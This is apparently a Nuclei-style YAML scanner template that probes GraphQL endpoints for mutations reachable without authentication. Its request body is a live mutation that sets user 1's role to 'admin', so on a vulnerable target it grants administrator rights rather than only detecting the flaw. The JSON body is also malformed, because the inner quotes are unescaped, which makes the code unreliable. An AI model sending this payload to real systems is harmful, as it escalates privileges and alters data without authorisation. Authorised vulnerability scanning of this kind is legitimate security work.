id: m7-graphql-mutations
info:
  name: M7 - GraphQL Mutations Without Auth
  author: Sharlix
  severity: high
  description: GraphQL mutations accessible without authentication
  tags: graphql,mutations,auth,m7hunter

requests:
  - method: POST
    path:
      - "{{BaseURL}}/graphql"
      - "{{BaseURL}}/api/graphql"

    body: '{"query":"mutation { updateUser(id: 1, role: "admin") { id role } }"}'
    headers:
      Content-Type: application/json

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        dsl:
          - "!contains(body, 'unauthorized') && !contains(body, 'forbidden')"
          - "contains(body, 'admin') || contains(body, 'role')"
        condition: and
